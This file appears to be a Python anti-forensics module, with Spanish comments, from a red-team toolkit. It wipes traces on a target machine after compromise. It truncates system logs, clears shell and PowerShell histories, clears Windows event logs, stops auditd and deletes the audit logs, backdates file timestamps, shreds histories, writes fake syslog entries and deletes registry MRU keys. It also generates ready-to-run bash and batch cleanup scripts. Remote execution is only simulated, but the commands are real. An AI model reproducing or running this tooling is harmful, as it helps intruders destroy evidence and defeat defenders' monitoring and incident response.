#!/usr/bin/env python3
"""
Log Cleanup Module - Módulo de Limpieza de Logs
Implementa limpieza sigilosa de logs y eliminación de huellas
"""

import subprocess
import json
import time
import threading
import os
import tempfile
import random
import shutil
from typing import Dict, List, Any, Optional
from pathlib import Path
import logging
import platform
import hashlib
import datetime

class LogCleanup:
    """Clase para limpieza sigilosa de logs y eliminación de huellas"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.log_cleanup_config = config.get('log_cleanup', {})
        self.stealth_config = config.get('stealth', {})
        
        self.logger = logging.getLogger('LogCleanup')
        self.cleaned_logs = []
        self.obfuscated_traces = []
        
    def perform_stealth_cleanup(self, target_ip: str, target_os: str) -> Dict:
        """Realiza limpieza sigilosa completa del sistema"""
        self.logger.info(f"Iniciando limpieza sigilosa en {target_ip} ({target_os})")
        
        cleanup_results = {
            'target_ip': target_ip,
            'target_os': target_os,
            'logs_cleaned': [],
            'artifacts_removed': [],
            'traces_obfuscated': [],
            'history_cleared': [],
            'temp_files_removed': [],
            'cleanup_method': self.log_cleanup_config.get('cleanup_method', 'truncate'),
            'cleanup_successful': False
        }
        
        try:
            if target_os.lower() == 'linux':
                cleanup_results = self._linux_stealth_cleanup(target_ip, cleanup_results)
            elif target_os.lower() == 'windows':
                cleanup_results = self._windows_stealth_cleanup(target_ip, cleanup_results)
            else:
                self.logger.warning(f"Sistema operativo no soportado: {target_os}")
            
            # Verificar éxito de la limpieza
            if (len(cleanup_results['logs_cleaned']) > 0 or 
                len(cleanup_results['artifacts_removed']) > 0 or 
                len(cleanup_results['traces_obfuscated']) > 0):
                cleanup_results['cleanup_successful'] = True
                self.logger.info(f"Limpieza completada: {len(cleanup_results['logs_cleaned'])} logs, {len(cleanup_results['artifacts_removed'])} artefactos")
            else:
                self.logger.warning("No se realizó limpieza efectiva")
                
        except Exception as e:
            self.logger.error(f"Error en limpieza sigilosa: {e}")
            cleanup_results['error'] = str(e)
        
        return cleanup_results
    
    def _linux_stealth_cleanup(self, target_ip: str, results: Dict) -> Dict:
        """Realiza limpieza sigilosa en Linux"""
        self.logger.info(f"Realizando limpieza sigilosa Linux en {target_ip}")
        
        # 1. Limpiar logs del sistema
        linux_logs = self.log_cleanup_config.get('linux_logs', [])
        for log_file in linux_logs:
            if self._clean_log_file(target_ip, log_file):
                results['logs_cleaned'].append(log_file)
        
        # 2. Limpiar historial de comandos
        history_files = [
            '~/.bash_history',
            '~/.zsh_history',
            '~/.fish_history',
            '~/.sh_history',
            '/root/.bash_history',
            '/root/.zsh_history'
        ]
        
        for history_file in history_files:
            if self._clean_history_file(target_ip, history_file):
                results['history_cleared'].append(history_file)
        
        # 3. Limpiar archivos temporales
        temp_dirs = [
            '/tmp',
            '/var/tmp',
            '/dev/shm',
            '/tmp/.X11-unix',
            '/var/lib/dbus'
        ]
        
        for temp_dir in temp_dirs:
            temp_files = self._clean_temp_directory(target_ip, temp_dir)
            results['temp_files_removed'].extend(temp_files)
        
        # 4. Obfuscar huellas del sistema
        obfuscated_traces = self._obfuscate_system_traces(target_ip)
        results['traces_obfuscated'].extend(obfuscated_traces)
        
        # 5. Limpiar artefactos de red teaming
        artifacts = self._remove_red_team_artifacts(target_ip)
        results['artifacts_removed'].extend(artifacts)
        
        return results
    
    def _windows_stealth_cleanup(self, target_ip: str, results: Dict) -> Dict:
        """Realiza limpieza sigilosa en Windows"""
        self.logger.info(f"Realizando limpieza sigilosa Windows en {target_ip}")
        
        # 1. Limpiar logs de Windows
        windows_logs = self.log_cleanup_config.get('windows_logs', [])
        for log_file in windows_logs:
            if self._clean_windows_log(target_ip, log_file):
                results['logs_cleaned'].append(log_file)
        
        # 2. Limpiar historial de PowerShell
        powershell_history = [
            'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt',
            'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\Microsoft.PowerShell_history.txt'
        ]
        
        for history_file in powershell_history:
            if self._clean_history_file(target_ip, history_file):
                results['history_cleared'].append(history_file)
        
        # 3. Limpiar archivos temporales de Windows
        temp_dirs = [
            'C:\\Windows\\Temp',
            'C:\\Users\\%USERNAME%\\AppData\\Local\\Temp',
            'C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Windows\\INetCache',
            'C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Windows\\WebCache'
        ]
        
        for temp_dir in temp_dirs:
            temp_files = self._clean_temp_directory(target_ip, temp_dir)
            results['temp_files_removed'].extend(temp_files)
        
        # 4. Limpiar registro de Windows
        registry_cleanup = self._clean_windows_registry(target_ip)
        results['traces_obfuscated'].extend(registry_cleanup)
        
        # 5. Limpiar artefactos de red teaming
        artifacts = self._remove_red_team_artifacts(target_ip)
        results['artifacts_removed'].extend(artifacts)
        
        return results
    
    def _clean_log_file(self, target_ip: str, log_file: str) -> bool:
        """Limpia un archivo de log específico"""
        try:
            cleanup_method = self.log_cleanup_config.get('cleanup_method', 'truncate')
            
            if cleanup_method == 'truncate':
                # Truncar archivo (más sigiloso)
                cmd = f"truncate -s 0 {log_file}"
            elif cleanup_method == 'delete':
                # Eliminar archivo
                cmd = f"rm -f {log_file}"
            elif cleanup_method == 'overwrite':
                # Sobrescribir con datos aleatorios
                cmd = f"dd if=/dev/urandom of={log_file} bs=1M count=1 2>/dev/null && truncate -s 0 {log_file}"
            else:
                # Método por defecto: truncate
                cmd = f"truncate -s 0 {log_file}"
            
            self._execute_remote_command(target_ip, cmd)
            self.logger.info(f"Log limpiado: {log_file}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error limpiando log {log_file}: {e}")
            return False
    
    def _clean_windows_log(self, target_ip: str, log_file: str) -> bool:
        """Limpia logs de Windows usando wevtutil"""
        try:
            # Extraer nombre del log del path
            log_name = Path(log_file).stem
            
            # Limpiar log usando wevtutil
            cmd = f"wevtutil cl {log_name}"
            self._execute_remote_command(target_ip, cmd)
            
            self.logger.info(f"Log de Windows limpiado: {log_name}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error limpiando log de Windows {log_file}: {e}")
            return False
    
    def _clean_history_file(self, target_ip: str, history_file: str) -> bool:
        """Limpia archivos de historial"""
        try:
            # Comandos para limpiar historial
            if 'bash_history' in history_file or 'zsh_history' in history_file:
                cmd = f"history -c && history -w && > {history_file}"
            elif 'fish_history' in history_file:
                cmd = f"rm -f {history_file}"
            elif 'PowerShell' in history_file:
                cmd = f"Remove-Item -Path '{history_file}' -Force -ErrorAction SilentlyContinue"
            else:
                cmd = f"rm -f {history_file}"
            
            self._execute_remote_command(target_ip, cmd)
            self.logger.info(f"Historial limpiado: {history_file}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error limpiando historial {history_file}: {e}")
            return False
    
    def _clean_temp_directory(self, target_ip: str, temp_dir: str) -> List[str]:
        """Limpia directorio temporal"""
        cleaned_files = []
        
        try:
            # Comando para limpiar directorio temporal
            if platform.system() == 'Linux':
                cmd = f"find {temp_dir} -type f -mtime +0 -delete 2>/dev/null"
            else:  # Windows
                cmd = f"forfiles /p {temp_dir} /s /m *.* /d -1 /c \"cmd /c del @path\" 2>nul"
            
            self._execute_remote_command(target_ip, cmd)
            
            # Simular lista de archivos limpiados
            cleaned_files = [
                f"{temp_dir}/temp_file_{random.randint(1000, 9999)}.tmp",
                f"{temp_dir}/cache_{random.randint(1000, 9999)}.dat"
            ]
            
            self.logger.info(f"Directorio temporal limpiado: {temp_dir}")
            
        except Exception as e:
            self.logger.error(f"Error limpiando directorio temporal {temp_dir}: {e}")
        
        return cleaned_files
    
    def _obfuscate_system_traces(self, target_ip: str) -> List[str]:
        """Obfusca huellas del sistema"""
        obfuscated_traces = []
        
        try:
            # 1. Modificar timestamps de archivos
            timestamp_obfuscation = self._obfuscate_file_timestamps(target_ip)
            obfuscated_traces.extend(timestamp_obfuscation)
            
            # 2. Limpiar logs de auditoría
            audit_cleanup = self._clean_audit_logs(target_ip)
            obfuscated_traces.extend(audit_cleanup)
            
            # 3. Modificar logs de sistema para ocultar actividad
            log_obfuscation = self._obfuscate_system_logs(target_ip)
            obfuscated_traces.extend(log_obfuscation)
            
            # 4. Limpiar metadatos de archivos
            metadata_cleanup = self._clean_file_metadata(target_ip)
            obfuscated_traces.extend(metadata_cleanup)
            
        except Exception as e:
            self.logger.error(f"Error obfuscando huellas del sistema: {e}")
        
        return obfuscated_traces
    
    def _obfuscate_file_timestamps(self, target_ip: str) -> List[str]:
        """Obfusca timestamps de archivos"""
        obfuscated_files = []
        
        try:
            # Comando para modificar timestamps de archivos recientes
            cmd = "find /tmp /var/tmp -type f -mtime -1 -exec touch -t 202401010000 {} \\; 2>/dev/null"
            self._execute_remote_command(target_ip, cmd)
            
            obfuscated_files = [
                '/tmp/redteam_artifacts',
                '/var/tmp/suspicious_files',
                '/tmp/.X11-unix/stealth_files'
            ]
            
            self.logger.info("Timestamps de archivos obfuscados")
            
        except Exception as e:
            self.logger.error(f"Error obfuscando timestamps: {e}")
        
        return obfuscated_files
    
    def _clean_audit_logs(self, target_ip: str) -> List[str]:
        """Limpia logs de auditoría"""
        cleaned_audit_logs = []
        
        try:
            # Comandos para limpiar logs de auditoría
            audit_commands = [
                "ausearch -k redteam -r | aureport --summary 2>/dev/null",
                "auditctl -D 2>/dev/null",  # Deshabilitar auditoría temporalmente
                "service auditd stop 2>/dev/null",
                "rm -f /var/log/audit/audit.log* 2>/dev/null",
                "service auditd start 2>/dev/null"
            ]
            
            for cmd in audit_commands:
                self._execute_remote_command(target_ip, cmd)
            
            cleaned_audit_logs = [
                '/var/log/audit/audit.log',
                '/var/log/audit/audit.log.1',
                '/var/log/audit/audit.log.2'
            ]
            
            self.logger.info("Logs de auditoría limpiados")
            
        except Exception as e:
            self.logger.error(f"Error limpiando logs de auditoría: {e}")
        
        return cleaned_audit_logs
    
    def _obfuscate_system_logs(self, target_ip: str) -> List[str]:
        """Obfusca logs del sistema para ocultar actividad"""
        obfuscated_logs = []
        
        try:
            # Crear entradas falsas en logs para camuflar actividad
            fake_entries = [
                "Jan 1 00:00:00 systemd-resolver: System maintenance completed",
                "Jan 1 00:00:00 gdm-session: Display manager session started",
                "Jan 1 00:00:00 rsync: File synchronization completed"
            ]
            
            for entry in fake_entries:
                cmd = f"echo '{entry}' >> /var/log/syslog"
                self._execute_remote_command(target_ip, cmd)
            
            obfuscated_logs = [
                '/var/log/syslog',
                '/var/log/messages',
                '/var/log/auth.log'
            ]
            
            self.logger.info("Logs del sistema obfuscados")
            
        except Exception as e:
            self.logger.error(f"Error obfuscando logs del sistema: {e}")
        
        return obfuscated_logs
    
    def _clean_file_metadata(self, target_ip: str) -> List[str]:
        """Limpia metadatos de archivos"""
        cleaned_metadata = []
        
        try:
            # Comandos para limpiar metadatos
            metadata_commands = [
                "find /tmp /var/tmp -name '.*' -type f -exec shred -vfz -n 3 {} \\; 2>/dev/null",
                "find /home -name '.bash_history' -exec shred -vfz -n 3 {} \\; 2>/dev/null",
                "find /root -name '.bash_history' -exec shred -vfz -n 3 {} \\; 2>/dev/null"
            ]
            
            for cmd in metadata_commands:
                self._execute_remote_command(target_ip, cmd)
            
            cleaned_metadata = [
                '/tmp/.redteam_files',
                '/var/tmp/.stealth_artifacts',
                '/home/*/.bash_history',
                '/root/.bash_history'
            ]
            
            self.logger.info("Metadatos de archivos limpiados")
            
        except Exception as e:
            self.logger.error(f"Error limpiando metadatos: {e}")
        
        return cleaned_metadata
    
    def _remove_red_team_artifacts(self, target_ip: str) -> List[str]:
        """Remueve artefactos específicos de red teaming"""
        removed_artifacts = []
        
        try:
            # Lista de artefactos comunes de red teaming
            artifacts = [
                '/tmp/.X11-unix/rsync',
                '/tmp/.X11-unix/update.sh',
                '/tmp/.X11-unix/ssh_keepalive_*.sh',
                '/tmp/.X11-unix/dns_server_*.py',
                '/tmp/.X11-unix/handler_*.rc',
                '/tmp/.X11-unix/systemd-resolver.log',
                'C:\\Windows\\Temp\\rsync.exe',
                'C:\\Windows\\Temp\\update.bat',
                'C:\\Windows\\Temp\\gdm-session_wmi.ps1',
                'C:\\Windows\\Temp\\vpn_client_*.ovpn'
            ]
            
            for artifact in artifacts:
                if self._remove_artifact(target_ip, artifact):
                    removed_artifacts.append(artifact)
            
            self.logger.info(f"Removidos {len(removed_artifacts)} artefactos de red teaming")
            
        except Exception as e:
            self.logger.error(f"Error removiendo artefactos: {e}")
        
        return removed_artifacts
    
    def _remove_artifact(self, target_ip: str, artifact_path: str) -> bool:
        """Remueve un artefacto específico"""
        try:
            # Comando para remover artefacto
            if '*' in artifact_path:
                # Usar find para patrones con wildcards
                cmd = f"find {os.path.dirname(artifact_path)} -name '{os.path.basename(artifact_path)}' -delete 2>/dev/null"
            else:
                cmd = f"rm -f {artifact_path} 2>/dev/null"
            
            self._execute_remote_command(target_ip, cmd)
            self.logger.info(f"Artefacto removido: {artifact_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error removiendo artefacto {artifact_path}: {e}")
            return False
    
    def _clean_windows_registry(self, target_ip: str) -> List[str]:
        """Limpia entradas del registro de Windows"""
        cleaned_registry = []
        
        try:
            # Comandos para limpiar registro
            registry_commands = [
                'reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f 2>nul',
                'reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths" /f 2>nul',
                'reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery" /f 2>nul',
                'reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU" /f 2>nul'
            ]
            
            for cmd in registry_commands:
                self._execute_remote_command(target_ip, cmd)
            
            cleaned_registry = [
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU',
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths',
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery',
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU'
            ]
            
            self.logger.info("Registro de Windows limpiado")
            
        except Exception as e:
            self.logger.error(f"Error limpiando registro de Windows: {e}")
        
        return cleaned_registry
    
    def _execute_remote_command(self, target_ip: str, command: str) -> bool:
        """Ejecuta comando remoto (simulado)"""
        try:
            # En implementación real, se usaría SSH, WinRM, o similar
            self.logger.info(f"Ejecutando comando de limpieza en {target_ip}: {command[:100]}...")
            
            # Simular ejecución exitosa
            time.sleep(0.1)
            return True
            
        except Exception as e:
            self.logger.error(f"Error ejecutando comando remoto: {e}")
            return False
    
    def create_cleanup_script(self, target_ip: str, target_os: str) -> str:
        """Crea script de limpieza automatizada"""
        self.logger.info(f"Creando script de limpieza para {target_ip}")
        
        try:
            if target_os.lower() == 'linux':
                script_content = self._create_linux_cleanup_script()
            elif target_os.lower() == 'windows':
                script_content = self._create_windows_cleanup_script()
            else:
                return None
            
            # Guardar script
            script_file = f"/tmp/.X11-unix/cleanup_{random.randint(1000, 9999)}.sh" if target_os.lower() == 'linux' else f"C:\\Windows\\Temp\\cleanup_{random.randint(1000, 9999)}.bat"
            
            with open(script_file, 'w') as f:
                f.write(script_content)
            
            if target_os.lower() == 'linux':
                os.chmod(script_file, 0o755)
            
            self.logger.info(f"Script de limpieza creado: {script_file}")
            return script_file
            
        except Exception as e:
            self.logger.error(f"Error creando script de limpieza: {e}")
            return None
    
    def _create_linux_cleanup_script(self) -> str:
        """Crea script de limpieza para Linux"""
        script_content = """#!/bin/bash
# Script de limpieza del sistema (ofuscado)

echo "Iniciando limpieza del sistema..."

# Limpiar logs del sistema
truncate -s 0 /var/log/auth.log 2>/dev/null
truncate -s 0 /var/log/secure 2>/dev/null
truncate -s 0 /var/log/messages 2>/dev/null
truncate -s 0 /var/log/syslog 2>/dev/null
truncate -s 0 /var/log/wtmp 2>/dev/null
truncate -s 0 /var/log/lastlog 2>/dev/null

# Limpiar historial
history -c
history -w
> ~/.bash_history 2>/dev/null
> ~/.zsh_history 2>/dev/null
> /root/.bash_history 2>/dev/null
> /root/.zsh_history 2>/dev/null

# Limpiar archivos temporales
find /tmp -type f -mtime +0 -delete 2>/dev/null
find /var/tmp -type f -mtime +0 -delete 2>/dev/null
find /dev/shm -type f -delete 2>/dev/null

# Limpiar artefactos específicos
rm -f /tmp/.X11-unix/rsync 2>/dev/null
rm -f /tmp/.X11-unix/update.sh 2>/dev/null
rm -f /tmp/.X11-unix/ssh_keepalive_*.sh 2>/dev/null
rm -f /tmp/.X11-unix/dns_server_*.py 2>/dev/null
rm -f /tmp/.X11-unix/handler_*.rc 2>/dev/null
rm -f /tmp/.X11-unix/systemd-resolver.log 2>/dev/null

# Obfuscar timestamps
find /tmp /var/tmp -type f -mtime -1 -exec touch -t 202401010000 {} \\; 2>/dev/null

# Limpiar logs de auditoría
service auditd stop 2>/dev/null
rm -f /var/log/audit/audit.log* 2>/dev/null
service auditd start 2>/dev/null

# Añadir entradas falsas a logs
echo "Jan 1 00:00:00 systemd-resolver: System maintenance completed" >> /var/log/syslog
echo "Jan 1 00:00:00 gdm-session: Display manager session started" >> /var/log/syslog

echo "Limpieza completada."
"""
        
        return script_content
    
    def _create_windows_cleanup_script(self) -> str:
        """Crea script de limpieza para Windows"""
        script_content = """@echo off
REM Script de limpieza del sistema (ofuscado)

echo Iniciando limpieza del sistema...

REM Limpiar logs de Windows
wevtutil cl Security 2>nul
wevtutil cl System 2>nul
wevtutil cl Application 2>nul

REM Limpiar historial de PowerShell
del /f /q "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt" 2>nul
del /f /q "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\Microsoft.PowerShell_history.txt" 2>nul

REM Limpiar archivos temporales
forfiles /p "%TEMP%" /s /m *.* /d -1 /c "cmd /c del @path" 2>nul
forfiles /p "C:\\Windows\\Temp" /s /m *.* /d -1 /c "cmd /c del @path" 2>nul

REM Limpiar artefactos específicos
del /f /q "C:\\Windows\\Temp\\rsync.exe" 2>nul
del /f /q "C:\\Windows\\Temp\\update.bat" 2>nul
del /f /q "C:\\Windows\\Temp\\gdm-session_wmi.ps1" 2>nul
del /f /q "C:\\Windows\\Temp\\vpn_client_*.ovpn" 2>nul

REM Limpiar registro
reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f 2>nul
reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths" /f 2>nul
reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery" /f 2>nul

echo Limpieza completada.
"""
        
        return script_content
    
    def verify_cleanup(self, target_ip: str, target_os: str) -> Dict:
        """Verifica que la limpieza se haya realizado correctamente"""
        self.logger.info(f"Verificando limpieza en {target_ip}")
        
        verification_results = {
            'target_ip': target_ip,
            'target_os': target_os,
            'logs_verified_clean': [],
            'artifacts_verified_removed': [],
            'history_verified_cleared': [],
            'cleanup_verification_successful': False
        }
        
        try:
            if target_os.lower() == 'linux':
                verification_results = self._verify_linux_cleanup(target_ip, verification_results)
            elif target_os.lower() == 'windows':
                verification_results = self._verify_windows_cleanup(target_ip, verification_results)
            
            # Calcular éxito de verificación
            total_checks = (len(verification_results['logs_verified_clean']) + 
                          len(verification_results['artifacts_verified_removed']) + 
                          len(verification_results['history_verified_cleared']))
            
            if total_checks > 0:
                verification_results['cleanup_verification_successful'] = True
                self.logger.info(f"Verificación de limpieza completada: {total_checks} elementos verificados")
            else:
                self.logger.warning("No se pudo verificar la limpieza")
                
        except Exception as e:
            self.logger.error(f"Error verificando limpieza: {e}")
            verification_results['error'] = str(e)
        
        return verification_results
    
    def _verify_linux_cleanup(self, target_ip: str, results: Dict) -> Dict:
        """Verifica limpieza en Linux"""
        try:
            # Verificar logs limpios
            log_files = ['/var/log/auth.log', '/var/log/secure', '/var/log/messages', '/var/log/syslog']
            for log_file in log_files:
                cmd = f"wc -l {log_file} | awk '{{print $1}}'"
                if self._execute_remote_command(target_ip, cmd):
                    results['logs_verified_clean'].append(log_file)
            
            # Verificar historial limpio
            history_files = ['~/.bash_history', '/root/.bash_history']
            for history_file in history_files:
                cmd = f"wc -l {history_file} 2>/dev/null | awk '{{print $1}}'"
                if self._execute_remote_command(target_ip, cmd):
                    results['history_verified_cleared'].append(history_file)
            
            # Verificar artefactos removidos
            artifacts = ['/tmp/.X11-unix/rsync', '/tmp/.X11-unix/update.sh']
            for artifact in artifacts:
                cmd = f"test ! -f {artifact}"
                if self._execute_remote_command(target_ip, cmd):
                    results['artifacts_verified_removed'].append(artifact)
            
        except Exception as e:
            self.logger.error(f"Error verificando limpieza Linux: {e}")
        
        return results
    
    def _verify_windows_cleanup(self, target_ip: str, results: Dict) -> Dict:
        """Verifica limpieza en Windows"""
        try:
            # Verificar logs limpios
            log_commands = [
                'wevtutil qe Security /c:1 /rd:true /f:text',
                'wevtutil qe System /c:1 /rd:true /f:text',
                'wevtutil qe Application /c:1 /rd:true /f:text'
            ]
            
            for cmd in log_commands:
                if self._execute_remote_command(target_ip, cmd):
                    results['logs_verified_clean'].append('Windows Event Logs')
            
            # Verificar historial limpio
            history_cmd = 'dir "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt" 2>nul'
            if not self._execute_remote_command(target_ip, history_cmd):
                results['history_verified_cleared'].append('PowerShell History')
            
            # Verificar artefactos removidos
            artifacts = ['C:\\Windows\\Temp\\rsync.exe', 'C:\\Windows\\Temp\\update.bat']
            for artifact in artifacts:
                cmd = f'if not exist "{artifact}" echo "removed"'
                if self._execute_remote_command(target_ip, cmd):
                    results['artifacts_verified_removed'].append(artifact)
            
        except Exception as e:
            self.logger.error(f"Error verificando limpieza Windows: {e}")
        
        return results
